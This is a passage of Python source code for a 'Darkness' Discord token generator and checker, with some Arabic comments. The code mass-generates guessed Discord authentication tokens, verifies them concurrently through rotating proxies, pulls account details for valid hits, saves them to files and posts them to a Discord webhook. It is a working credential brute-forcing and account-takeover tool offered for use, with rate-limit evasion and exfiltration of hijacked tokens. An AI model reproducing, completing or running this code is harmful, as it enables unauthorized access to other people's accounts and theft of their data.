            # إذا كانت الجلسة مغلقة بعد عدد من المحاولات، إعادة تهيئتها
            if verify and i % 10 == 0 and (not self.session or self.session.closed):
                await self.init_session()
                
            token, format_type = self.generate_token(token_type)
            if verify:
                is_valid = await self.verify_token_async(token)
                status = f"{Colors.SUCCESS}VALID" if is_valid else f"{Colors.ERROR}INVALID"
                if is_valid:
                    self.valid_tokens.append(token)
                    user_info = await self.get_user_info(token)
                    if user_info:
                        await self.print_user_info(token, user_info)
                        # First save the token to the file
                        await self.save_valid_token(token, user_info)
                        # Then send to webhook if enabled
                        if self.webhook_url:
                            await self.send_webhook(token, user_info)
                    self.total_valid += 1
                    self.save_generated_token(token, True)
                else:
                    self.invalid_tokens.append(token)
            else:
                status = f"{Colors.WARNING}NOT VERIFIED"
                self.save_generated_token(token)  # Save unverified tokens
            
            count += 1
            self.total_generated += 1
            self.update_title()
            
            current_time = time.time()
            elapsed = current_time - start_time
            speed = count / max(elapsed, 0.001)
            
            print(f"\n{Colors.CYAN}[{i+1}/{amount}] {Colors.WHITE}Token: {Colors.SECONDARY}{token}{Colors.RESET}")
            print(f"{Colors.CYAN}[*] {Colors.WHITE}Format: {Colors.SECONDARY}{format_type}{Colors.RESET}")
            print(f"{Colors.CYAN}[*] {Colors.WHITE}Status: {status}{Colors.RESET}")
            print(f"{Colors.CYAN}[*] {Colors.WHITE}Speed: {Colors.SECONDARY}{speed:.2f}/s{Colors.RESET}")
            print(f"{Colors.PRIMARY}{'═' * 70}{Colors.RESET}")
            
            await asyncio.sleep(self.speed)
            
        # Cancel stop key checker
        stop_checker.cancel()
        
        print(f"\n{Colors.INFO}Results:")
        print(f"{Colors.INFO}Total Generated: {Colors.WHITE}{count}")
        if verify:
            valid_count = len(self.valid_tokens)
            print(f"{Colors.INFO}Valid: {Colors.SUCCESS}{valid_count}")
            print(f"{Colors.INFO}Invalid: {Colors.ERROR}{count - valid_count}")
        
        if self.stop_flag:
            print(f"\n{Colors.SUCCESS}[✓] Operation stopped by user{Colors.RESET}")
            
            # إشعار بإيقاف العملية

        else:
            print(f"\n{Colors.SUCCESS}[✓] Operation completed{Colors.RESET}")

    async def verify_tokens_from_file(self, filename=None):
        """Verify tokens from a file with enhanced error handling"""
        self.stop_flag = False
        self.show_title = True  # Enable title display
        self.is_checking = True  # Set operation type to checking
        set_console_title(self)
        
        # Start stop key checker
        stop_checker = asyncio.create_task(self.check_stop_key())
        
        print(f"\n{Colors.WARNING}[!] Press ESC to stop operation{Colors.RESET}")
        
        if not filename or filename.strip() == "":
            filename = self.default_check_file
            print(f"{Colors.INFO}Using default tokens file: {filename}")
        # If user input doesn't include directory but file exists in tokens directory
        elif not os.path.exists(filename) and not '/' in filename and not '\\' in filename:
            potential_path = os.path.join(self.tokens_dir, filename)
            if os.path.exists(potential_path):
                filename = potential_path
                print(f"{Colors.INFO}Using file from tokens directory: {filename}")

        try:
            with open(filename, 'r') as f:
                tokens = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            error_msg = f"File '{filename}' not found"
            print(f"{Colors.ERROR}[!] Error: {error_msg}{Colors.RESET}")
            self.show_title = False
            self.is_checking = False
            set_console_title(self)
            return
        except PermissionError:
            error_msg = f"No permission to read file '{filename}'"
            print(f"{Colors.ERROR}[!] Error: {error_msg}{Colors.RESET}")
            self.show_title = False
            self.is_checking = False
            set_console_title(self)
            return
        except Exception as e:
            error_msg = f"Error reading file: {str(e)}"
            print(f"{Colors.ERROR}[!] {error_msg}{Colors.RESET}")
            self.show_title = False
            self.is_checking = False
            set_console_title(self)
            return

        if not tokens:
            print(f"{Colors.WARNING}[!] No tokens found in file{Colors.RESET}")
            self.show_title = False
            self.is_checking = False
            set_console_title(self)
            return

        print(f"\n{Colors.INFO}Found {len(tokens)} tokens in file.")
        print(f"{Colors.PRIMARY}{'═' * 70}{Colors.RESET}")
        
        # تهيئة جلسة جديدة للاستخدام في هذه الوظيفة
        await self.init_session()
        
        # تقسيم التوكنات إلى مجموعات حسب عدد الثريدات
        chunk_size = self.max_threads
        token_chunks = [tokens[i:i + chunk_size] for i in range(0, len(tokens), chunk_size)]
        
        valid_count = 0
        error_count = 0
        
        for chunk_index, chunk in enumerate(token_chunks):
            if self.stop_flag:
                break
                
            # إنشاء قائمة من المهام للتوكنات في هذه المجموعة
            tasks = [self.verify_token_async(token) for token in chunk]
            
            # تنفيذ جميع المهام في المجموعة بشكل متوازٍ
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # معالجة النتائج
            for i, result in enumerate(results):
                if isinstance(result, Exception):
                    error_count += 1
                elif result:
                    valid_count += 1
                    
                # تحديث التقدم
                current_token = chunk_index * chunk_size + i + 1
                print(f"\r{Colors.CYAN}Progress: {current_token}/{len(tokens)} | Valid: {Colors.SUCCESS}{valid_count}{Colors.CYAN} | Invalid: {Colors.ERROR}{current_token - valid_count - error_count}{Colors.CYAN} | Errors: {Colors.WARNING}{error_count}{Colors.RESET}", end='')
            
            # إعادة تهيئة الجلسة بعد كل مجموعة
            if self.session.closed or not self.session:
                await self.init_session()

        # Final Statistics
        print(f"\n{Colors.SUCCESS}Results:")
        print(f"{Colors.INFO}Total Tokens: {Colors.WHITE}{len(tokens)}")
        print(f"{Colors.INFO}Valid Tokens: {Colors.SUCCESS}{valid_count}")
        print(f"{Colors.INFO}Invalid Tokens: {Colors.ERROR}{len(tokens) - valid_count - error_count}")
        print(f"{Colors.INFO}Errors: {Colors.WARNING}{error_count}")
        print(f"{Colors.PRIMARY}{'═' * 70}{Colors.RESET}")
        
        # Update statistics
        self.total_checked += len(tokens)
        self.total_valid += valid_count
        
        # Cancel stop key checker
        stop_checker.cancel()
        
        self.show_title = False  # Disable title display when done
        self.is_checking = False  # Reset operation type
        set_console_title(self)
        
        if self.stop_flag:
            print(f"\n{Colors.SUCCESS}[✓] Operation stopped by user{Colors.RESET}")
        else:
            print(f"\n{Colors.SUCCESS}[✓] Operation completed{Colors.RESET}")

    def load_proxies(self):
        """تحميل البروكسيات من الملف"""
        try:
            if os.path.exists(self.proxies_file):
                with open(self.proxies_file, 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                print(f"{Colors.SUCCESS}[✓] Loaded {len(self.proxies)} proxies from {self.proxies_file}")
            elif os.path.exists('proxies.txt'):  # Fallback to legacy file
                with open('proxies.txt', 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                print(f"{Colors.SUCCESS}[✓] Loaded {len(self.proxies)} proxies from legacy proxies.txt")
                # Save to new location
                self.save_proxies()
        except Exception as e:
            print(f"{Colors.ERROR}[!] Error loading proxies: {str(e)}")
            self.proxies = []
            
    def save_proxies(self):
        """Save proxies to the new directory structure"""
        try:
            with open(self.proxies_file, 'w') as f:
                for proxy in self.proxies:
                    f.write(f"{proxy}\n")
            print(f"{Colors.SUCCESS}[✓] Saved {len(self.proxies)} proxies to {self.proxies_file}")
        except Exception as e:
            print(f"{Colors.ERROR}[!] Error saving proxies: {str(e)}")

    def get_next_proxy(self):
        """الحصول على البروكسي التالي من القائمة"""
        if not self.proxies:
            return None
            
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        
        # إضافة البروتوكول إذا لم يكن موجوداً
        if not proxy.startswith(('http://', 'socks4://', 'socks5://')):
            proxy = 'http://' + proxy
            
        return proxy

    def set_proxy(self, proxy=None, enabled=True):
        """Set proxy settings
        Supported formats:
        - HTTP: http://user:pass@host:port or http://host:port
        - SOCKS4: socks4://user:pass@host:port or socks4://host:port
        - SOCKS5: socks5://user:pass@host:port or socks5://host:port
        - proxies.txt: Use proxies from file with auto-rotation
        """
        # إذا كانت القيمة none أو فارغة، قم بتعطيل البروكسي
        if proxy is None or proxy.lower() == 'none' or proxy.strip() == '':
            self.use_proxy = False
            self.proxy = None
            print(f"{Colors.SUCCESS}[✓] Proxy disabled")
            self.save_settings()
            return True
            
        # إذا كان التفعيل مطلوباً وتم تمرير قيمة للبروكسي
        if enabled:
            if proxy.lower() == 'proxies.txt':
                # تحميل وتفعيل البروكسيات من الملف
                self.load_proxies()
                if self.proxies:
                    self.proxy = self.get_next_proxy()
                    self.use_proxy = True
                    print(f"{Colors.SUCCESS}[✓] Proxy rotation enabled with {len(self.proxies)} proxies")
                    print(f"{Colors.INFO}[*] Current proxy: {self.proxy}")
                    self.save_settings()
                    return True
                else:
                    print(f"{Colors.ERROR}[!] No valid proxies found in {self.proxies_file}")
                    return False
            else:
                # تحقق من تنسيق البروكسي المدخل مباشرة
                proxy = proxy.strip().lower()
                valid = self._validate_proxy(proxy)
                if valid:
                    self.proxy = proxy
                    self.use_proxy = True
                    print(f"{Colors.SUCCESS}[✓] Single proxy enabled: {proxy}")
                    print(f"{Colors.INFO}[*] Type: {proxy.split('://')[0].upper()}")
                    self.save_settings()
                    return True
                return False
        else:
            # إذا كان التفعيل غير مطلوب
            self.proxy = None
            self.use_proxy = False
            print(f"{Colors.SUCCESS}[✓] Proxy disabled")
            self.save_settings()
            return True

    def _validate_proxy(self, proxy):
        """Validate proxy format"""
        try:
            # Validate supported protocols
            valid_protocols = ['http://', 'socks4://', 'socks5://']
            if not any(proxy.startswith(protocol) for protocol in valid_protocols):
                print(f"{Colors.ERROR}[!] Invalid proxy format. Supported formats:")
                print(f"{Colors.INFO}HTTP: http://user:pass@host:port or http://host:port")
                print(f"{Colors.INFO}SOCKS4: socks4://user:pass@host:port or socks4://host:port")
                print(f"{Colors.INFO}SOCKS5: socks5://user:pass@host:port or socks5://host:port")
                return False

            # التحقق من تنسيق المضيف والمنفذ
            if '@' in proxy:
                host_part = proxy.split('@')[1]
            else:
                host_part = proxy.split('://')[-1]

            host, port = host_part.split(':')
            port = int(port)
            if not (0 < port <= 65535):
                raise ValueError("Invalid port number")

            return True
        except Exception as e:
            print(f"{Colors.ERROR}[!] Invalid proxy format: {str(e)}")
            return False

    def get_settings_info(self):
        return {
            "Speed": f"{self.speed:.3f} seconds",
            "Max Threads": str(self.max_threads),
            "Webhook": "Enabled" if self.webhook_url else "Disabled",
            "Save Tokens": "Enabled" if self.save_tokens else "Disabled",
            "Proxy Status:": f"Enabled ({self.proxy})" if self.use_proxy and self.proxy else "Disabled",
            "Total Generated": str(self.total_generated),
            "Total Valid": str(self.total_valid),
            "Total Checked": str(self.total_checked)
        }

    def save_settings(self):
        """Save settings to file"""
        settings = {
            "webhook_url": self.webhook_url,
            "speed": self.speed,
            "max_threads": self.max_threads,
            "save_tokens": self.save_tokens,
            "use_proxy": self.use_proxy,
            "proxy": self.proxy,
            "stats": {
                "total_generated": self.total_generated,
                "total_valid": self.total_valid,
                "total_checked": self.total_checked
            }
        }
        
        try:
            with open(self.settings_file, 'w') as f:
                json.dump(settings, f, indent=4)
            print(f"{Colors.SUCCESS}[✓] Settings saved successfully!")
        except Exception as e:
            print(f"{Colors.ERROR}[!] Error saving settings: {str(e)}{Colors.RESET}")

    def load_settings(self):
        """Load settings from JSON file"""
        try:
            # First try to load from new location
            if os.path.exists(self.settings_file):
                with open(self.settings_file, 'r') as f:
                    settings = json.load(f)
                self.webhook_url = settings.get("webhook_url")
                self.speed = settings.get("speed", 0.1)
                self.max_threads = settings.get("max_threads", 100)
                self.save_tokens = settings.get("save_tokens", True)
                self.use_proxy = settings.get("use_proxy", False)
                self.proxy = settings.get("proxy", None)
                stats = settings.get("stats", {})
                self.total_generated = stats.get("total_generated", 0)
                self.total_valid = stats.get("total_valid", 0)
                self.total_checked = stats.get("total_checked", 0)
                print(f"{Colors.SUCCESS}[✓] Settings loaded successfully from {self.settings_file}!")
            # If not found, try to load from old location and migrate
            elif os.path.exists("generator_settings.json"):
                with open("generator_settings.json", 'r') as f:
                    settings = json.load(f)
                self.webhook_url = settings.get("webhook_url")
                self.speed = settings.get("speed", 0.1)
                self.max_threads = settings.get("max_threads", 100)
                self.save_tokens = settings.get("save_tokens", True)
                self.use_proxy = settings.get("use_proxy", False)
                self.proxy = settings.get("proxy", None)
                stats = settings.get("stats", {})
                self.total_generated = stats.get("total_generated", 0)
                self.total_valid = stats.get("total_valid", 0)
                self.total_checked = stats.get("total_checked", 0)
                
                # Save to new location
                self.save_settings()
                print(f"{Colors.SUCCESS}[✓] Settings migrated from legacy file to {self.settings_file}!")
        except Exception as e:
            print(f"{Colors.ERROR}[!] Failed to load settings: {e}")

    async def __del__(self):
        """Destructor to ensure session is closed properly"""
        try:
            if self.session and not self.session.closed:
                await self.session.close()
        except:
            pass

    async def close_session(self):
        """Close the session properly"""
        try:
            if self.session and not self.session.closed:
                await self.session.close()
                self.session = None
                print(f"{Colors.INFO}[*] Session closed properly{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.ERROR}[!] Error closing session: {str(e)}{Colors.RESET}")
            
    def __del__(self):
        """Non-async cleanup for synchronous destruction"""
        if self.session and not self.session.closed:
            print(f"{Colors.WARNING}[!] Session was not closed properly{Colors.RESET}")

def center_text(text, width=70):
    return text.center(width)

def print_banner():
    clear_screen()
    darkness_art = f"""
{Colors.PRIMARY}██████╗  █████╗ ██████╗ ██╗  ██╗███╗   ██╗███████╗███████╗███████╗
{Colors.PRIMARY}██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝████╗  ██║██╔════╝██╔════╝██╔════╝
{Colors.SECONDARY}██║  ██║███████║██████╔╝█████╔╝ ██╔██╗ ██║█████╗  ███████╗███████╗
{Colors.SECONDARY}██║  ██║██╔══██║██╔══██╗██╔═██╗ ██║╚██╗██║██╔══╝  ╚════██║╚════██║
{Colors.INFO}██████╔╝██║  ██║██║  ██║██║  ██╗██║ ╚████║███████╗███████║███████║
{Colors.INFO}╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝╚══════╝"""

    banner = f"""
{Colors.PRIMARY}╔{'═' * 68}╗{Colors.RESET}
{Colors.PRIMARY}║{center_text(f"{Colors.INFO} Discord Token Generator & Checker {Colors.PRIMARY}", 68)}║{Colors.RESET}
{Colors.PRIMARY}║{center_text("", 68)}║{Colors.RESET}
{darkness_art}
{Colors.PRIMARY}║{center_text("", 68)}║{Colors.RESET}
{Colors.PRIMARY}║{center_text(f"{Colors.SECONDARY} Version 1.0 - Enhanced Edition {Colors.PRIMARY}", 68)}║{Colors.RESET}
{Colors.PRIMARY}║{center_text("", 68)}║{Colors.RESET}
{Colors.PRIMARY}║{center_text(f"{Colors.SUCCESS} Made with for Darkness Community {Colors.PRIMARY}", 68)}║{Colors.RESET}
{Colors.PRIMARY}║{center_text(f"{Colors.INFO} Developer: Mokaram discord .69h. {Colors.PRIMARY}", 68)}║{Colors.RESET}
{Colors.PRIMARY}║{center_text(f"{Colors.WARNING} Join Darkness: discord.gg/ezcpCsxYc8 {Colors.PRIMARY}", 68)}║{Colors.RESET}
{Colors.PRIMARY}╚{'═' * 68}╝{Colors.RESET}

{Colors.SECONDARY}┏{'━' * 68}┓{Colors.RESET}
{Colors.SECONDARY}┃{center_text(f"{Colors.INFO} Premium Features {Colors.SECONDARY}", 68)}┃{Colors.RESET}
{Colors.SECONDARY}┃{center_text(f"{Colors.WHITE} Advanced Token Generation & Verification{Colors.SECONDARY}", 68)}┃{Colors.RESET}
{Colors.SECONDARY}┃{center_text(f"{Colors.WHITE} Discord Webhook Integration{Colors.SECONDARY}", 68)}┃{Colors.RESET}
{Colors.SECONDARY}┃{center_text(f"{Colors.WHITE} Auto-Save & Settings Management{Colors.SECONDARY}", 68)}┃{Colors.RESET}
{Colors.SECONDARY}┃{center_text(f"{Colors.WHITE} Real-time Token Validation{Colors.SECONDARY}", 68)}┃{Colors.RESET}
{Colors.SECONDARY}┗{'━' * 68}┛{Colors.RESET}
    """
    print(banner)

def print_menu():
    menu = f"""
{Colors.PRIMARY}┏{'━' * 50}┓{Colors.RESET}
{Colors.PRIMARY}┃{center_text(f"{Colors.INFO} Main Menu {Colors.PRIMARY}", 50) }                  ┃        {Colors.RESET}
{Colors.PRIMARY}┗{'━' * 50}┛{Colors.RESET}

{Colors.SUCCESS} Generation Options:{Colors.RESET}
{Colors.WHITE}[{Colors.INFO}1{Colors.WHITE}] {Colors.SECONDARY}Generate All Token Types Infinitely {Colors.RESET}
{Colors.WHITE}[{Colors.INFO}2{Colors.WHITE}] {Colors.SECONDARY}Generate Classic Tokens Infinitely {Colors.RESET}
{Colors.WHITE}[{Colors.INFO}3{Colors.WHITE}] {Colors.SECONDARY}Generate New Tokens Infinitely {Colors.RESET}
{Colors.WHITE}[{Colors.INFO}4{Colors.WHITE}] {Colors.SECONDARY}Generate Latest Tokens Infinitely {Colors.RESET}
{Colors.WHITE}[{Colors.INFO}5{Colors.WHITE}] {Colors.SECONDARY}Generate Specific Amount (All Types) {Colors.RESET}
{Colors.WHITE}[{Colors.INFO}6{Colors.WHITE}] {Colors.SECONDARY}Generate Specific Amount (Classic) {Colors.RESET}
{Colors.WHITE}[{Colors.INFO}7{Colors.WHITE}] {Colors.SECONDARY}Generate Specific Amount (New) {Colors.RESET}
{Colors.WHITE}[{Colors.INFO}8{Colors.WHITE}] {Colors.SECONDARY}Generate Specific Amount (Latest) {Colors.RESET}

{Colors.INFO} Verification Options:{Colors.RESET}
{Colors.WHITE}[{Colors.INFO}9{Colors.WHITE}] {Colors.SECONDARY}Generate & Verify All Types Infinitely {Colors.RESET}
{Colors.WHITE}[{Colors.INFO}10{Colors.WHITE}] {Colors.SECONDARY}Generate & Verify Specific Amount {Colors.RESET}
{Colors.WHITE}[{Colors.INFO}11{Colors.WHITE}] {Colors.SECONDARY}Check Tokens from File {Colors.RESET}

{Colors.WARNING} System Options:{Colors.RESET}
{Colors.WHITE}[{Colors.INFO}12{Colors.WHITE}] {Colors.SECONDARY}Settings {Colors.RESET}
{Colors.WHITE}[{Colors.INFO}13{Colors.WHITE}] {Colors.ERROR}Exit {Colors.RESET}

{Colors.PRIMARY}┏{'━' * 70}┓{Colors.RESET}
{Colors.PRIMARY}┃{center_text(f"{Colors.SUCCESS} Darkness Token Generator {Colors.PRIMARY}", 70)}┃{Colors.RESET}
{Colors.PRIMARY}┃{center_text(f"{Colors.INFO}Made by Mokaram | Join: discord.gg/ezcpCsxYc8{Colors.PRIMARY}", 70)}┃{Colors.RESET}
{Colors.PRIMARY}┗{'━' * 70}┛{Colors.RESET}
    """
    print(menu)

def print_settings_menu(generator):
    settings = generator.get_settings_info()
    menu = f"""
{Colors.PRIMARY}┏{'━' * 50}┓{Colors.RESET}
{Colors.PRIMARY}┃{center_text(f"{Colors.INFO} Settings Menu {Colors.PRIMARY}", 50)}┃{Colors.RESET}
{Colors.PRIMARY}┗{'━' * 50}┛{Colors.RESET}

{Colors.SUCCESS}Current Settings:{Colors.RESET}
{Colors.INFO}├─{Colors.WHITE} Generation Speed: {Colors.SECONDARY}{settings['Speed']}{Colors.RESET}
{Colors.INFO}├─{Colors.WHITE} Max Threads: {Colors.SECONDARY}{settings['Max Threads']}{Colors.RESET}
{Colors.INFO}├─{Colors.WHITE} Webhook Status: {Colors.SECONDARY}{settings['Webhook']}{Colors.RESET}
{Colors.INFO}├─{Colors.WHITE} Save Tokens: {Colors.SECONDARY}{settings['Save Tokens']}{Colors.RESET}
{Colors.INFO}├─{Colors.WHITE} Proxy Status: {Colors.SECONDARY}{settings['Proxy Status:']}{Colors.RESET}
{Colors.INFO}├─{Colors.WHITE} Total Generated: {Colors.SECONDARY}{settings['Total Generated']}{Colors.RESET}
{Colors.INFO}├─{Colors.WHITE} Total Valid: {Colors.SECONDARY}{settings['Total Valid']}{Colors.RESET}
{Colors.INFO}└─{Colors.WHITE} Total Checked: {Colors.SECONDARY}{settings['Total Checked']}{Colors.RESET}

{Colors.SUCCESS}Options:{Colors.RESET}
{Colors.WHITE}[{Colors.INFO}1{Colors.WHITE}] {Colors.SECONDARY}Set Generation Speed {Colors.RESET}
{Colors.WHITE}[{Colors.INFO}2{Colors.WHITE}] {Colors.SECONDARY}Set Max Threads {Colors.RESET}
{Colors.WHITE}[{Colors.INFO}3{Colors.WHITE}] {Colors.SECONDARY}Set Webhook URL {Colors.RESET}
{Colors.WHITE}[{Colors.INFO}4{Colors.WHITE}] {Colors.SECONDARY}Toggle Save Tokens {Colors.RESET}
{Colors.WHITE}[{Colors.INFO}5{Colors.WHITE}] {Colors.SECONDARY}Set Proxy {Colors.RESET}
{Colors.WHITE}[{Colors.INFO}6{Colors.WHITE}] {Colors.ERROR}Back to Main Menu {Colors.RESET}
    """
    print(menu)

def validate_speed(speed_str):
    try:
        speed = float(speed_str)
        if speed < 0:
            print(f"{Fore.RED}[!] Speed cannot be negative")
            return None
        return speed
    except ValueError:
        print(f"{Fore.RED}[!] Invalid speed value")
        return None

def validate_threads(threads_str):
    try:
        threads = int(threads_str)
        if threads < 1:
            print(f"{Fore.RED}[!] Threads must be at least 1")
            return None
        if threads > 1000:
            print(f"{Fore.RED}[!] Maximum allowed threads is 1000")
            return None
        return threads
    except ValueError:
        print(f"{Fore.RED}[!] Invalid thread count")
        return None

def validate_webhook_url(url):
    if url.lower() == 'none':
        return None
    if not url.startswith('https://discord.com/api/webhooks/'):
        print(f"{Fore.RED}[!] Invalid Discord webhook URL")
        return None
    return url

def print_status_line(current, total, valid, invalid, speed):
    print(f"\r{Colors.CYAN}Progress: {current}/{total} | Valid: {Colors.SUCCESS}{valid}{Colors.CYAN} | Invalid: {Colors.ERROR}{invalid}{Colors.CYAN} | Speed: {speed}/s", end='')

async def main():
    generator = TokenGenerator()
    try:
        while True:
            print_banner()
            print_menu()
            
            try:
                choice = input(f"\n{Colors.CYAN}[>] {Colors.WHITE}Enter your choice: ")
                
                # Save settings after each operation
                if choice in ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11"]:
                    generator.save_settings()
                    
                if choice == "1":
                    print(f"\n{Colors.WARNING}[!] Press ESC to stop generation")
                    try:
                        await generator.generate_infinite(verify=False, token_type="all")
                    except KeyboardInterrupt:
                        print(f"\n{Colors.ERROR}[!] Generation stopped")
                        generator.save_settings()
                        
                elif choice == "2":
                    print(f"\n{Colors.WARNING}[!] Press ESC to stop generation")
                    try:
                        await generator.generate_infinite(verify=False, token_type="classic")
                    except KeyboardInterrupt:
                        print(f"\n{Colors.ERROR}[!] Generation stopped")
                        generator.save_settings()
                        
                elif choice == "3":
                    print(f"\n{Colors.WARNING}[!] Press ESC to stop generation")
                    try:
                        await generator.generate_infinite(verify=False, token_type="new")
                    except KeyboardInterrupt:
                        print(f"\n{Colors.ERROR}[!] Generation stopped")
                        generator.save_settings()
                        
                elif choice == "4":
                    print(f"\n{Colors.WARNING}[!] Press ESC to stop generation")
                    try:
                        await generator.generate_infinite(verify=False, token_type="latest")
                    except KeyboardInterrupt:
                        print(f"\n{Colors.ERROR}[!] Generation stopped")
                        generator.save_settings()
                        
                elif choice == "5":
                    amount = int(input(f"\n{Colors.CYAN}[>] {Colors.WHITE}Enter amount of tokens to generate: "))
                    await generator.generate_specific(amount, verify=False, token_type="all")
                    generator.save_settings()
                    
                elif choice == "6":
                    amount = int(input(f"\n{Colors.CYAN}[>] {Colors.WHITE}Enter amount of tokens to generate: "))
                    await generator.generate_specific(amount, verify=False, token_type="classic")
                    generator.save_settings()
                    
                elif choice == "7":
                    amount = int(input(f"\n{Colors.CYAN}[>] {Colors.WHITE}Enter amount of tokens to generate: "))
                    await generator.generate_specific(amount, verify=False, token_type="new")
                    generator.save_settings()
                    
                elif choice == "8":
                    amount = int(input(f"\n{Colors.CYAN}[>] {Colors.WHITE}Enter amount of tokens to generate: "))
                    await generator.generate_specific(amount, verify=False, token_type="latest")
                    generator.save_settings()
                    
                elif choice == "9":
                    print(f"\n{Colors.WARNING}[!] Press ESC to stop generation and verification")
                    try:
                        await generator.generate_infinite(verify=True, token_type="all")
                    except KeyboardInterrupt:
                        print(f"\n{Colors.ERROR}[!] Generation stopped")
                        generator.save_settings()
                        
                elif choice == "10":
                    amount = int(input(f"\n{Colors.CYAN}[>] {Colors.WHITE}Enter amount of tokens to generate and verify: "))
                    await generator.generate_specific(amount, verify=True, token_type="all")
                    generator.save_settings()
                    
                elif choice == "11":
                    filename = input(f"\n{Colors.CYAN}[>] {Colors.WHITE}Enter tokens file path (or press Enter for default 'tokens.txt'): ")
                    await generator.verify_tokens_from_file(filename)
                    generator.save_settings()
                    
                elif choice == "12":  # Settings Menu
                    while True:
                        clear_screen()
                        print_banner()
                        print_settings_menu(generator)
                        
                        settings_choice = input(f"\n{Colors.CYAN}[>] {Colors.WHITE}Enter your choice: ")
                        
                        if settings_choice == "1":
                            while True:
                                speed = validate_speed(input(f"\n{Colors.CYAN}[>] {Colors.WHITE}Enter generation speed (delay in seconds, 0 for max speed): "))
                                if speed is not None:
                                    generator.set_speed(speed)
                                    generator.save_settings()
                                    print(f"{Colors.SUCCESS}[✓] Speed set to {speed} seconds")
                                    break
                        elif settings_choice == "2":
                            while True:
                                threads = validate_threads(input(f"\n{Colors.CYAN}[>] {Colors.WHITE}Enter max threads (1-1000): "))
                                if threads is not None:
                                    generator.set_threads(threads)
                                    generator.save_settings()
                                    print(f"{Colors.SUCCESS}[✓] Max threads set to {threads}")
                                    break
                        elif settings_choice == "3":
                            while True:
                                webhook = input(f"\n{Colors.CYAN}[>] {Colors.WHITE}Enter Discord webhook URL (or 'none' to disable): ").strip()
                                if webhook.lower() == 'none':
                                    if generator.set_webhook(None):
                                        break
                                elif webhook:
                                    if generator.set_webhook(webhook):
                                        break
                                else:
                                    print(f"{Colors.ERROR}[!] Please enter a valid webhook URL or 'none'")
                        elif settings_choice == "4":
                            generator.save_tokens = not generator.save_tokens
                            status = "enabled" if generator.save_tokens else "disabled"
                            generator.save_settings()
                            print(f"{Colors.SUCCESS}[✓] Save tokens {status}")
                        elif settings_choice == "5":
                            while True:
                                proxy = input(f"\n{Colors.CYAN}[>] {Colors.WHITE}Enter proxy URL (or 'none' to disable): ").strip()
                                if proxy.lower() == 'none':
                                    if generator.set_proxy(None):
                                        break
                                elif proxy:
                                    if generator.set_proxy(proxy):
                                        break
                                else:
                                    print(f"{Colors.ERROR}[!] Please enter a valid proxy URL or 'none'")
                        elif settings_choice == "6":
                            break
                        else:
                            print(f"\n{Colors.ERROR}[!] Invalid choice!")                            
                        input(f"\n{Colors.CYAN}[>] {Colors.WHITE}Press Enter to continue...")
                elif choice == "13":
                    print(f"\n{Colors.SUCCESS}[*] Thank you for using the token generator!")
                    generator.save_settings()
                    break
                else:
                    print(f"\n{Colors.ERROR}[!] Invalid choice!")
            except ValueError:
                print(f"\n{Colors.ERROR}[!] Please enter a valid number!")
            input(f"\n{Colors.CYAN}[>] {Colors.WHITE}Press Enter to continue...")
            # Clear screen
            print("\033[H\033[J")
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Program terminated by user")
        sys.exit(0)
    except Exception as e:
        error_msg = f"Unexpected error: {str(e)}"
        print(f"\n{Fore.RED}[!] {error_msg}")
        sys.exit(1)
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Program terminated by user")
        sys.exit(0)
    except Exception as e:
        error_msg = f"Unexpected error: {str(e)}"
        print(f"\n{Fore.RED}[!] {error_msg}")
        sys.exit(1) 
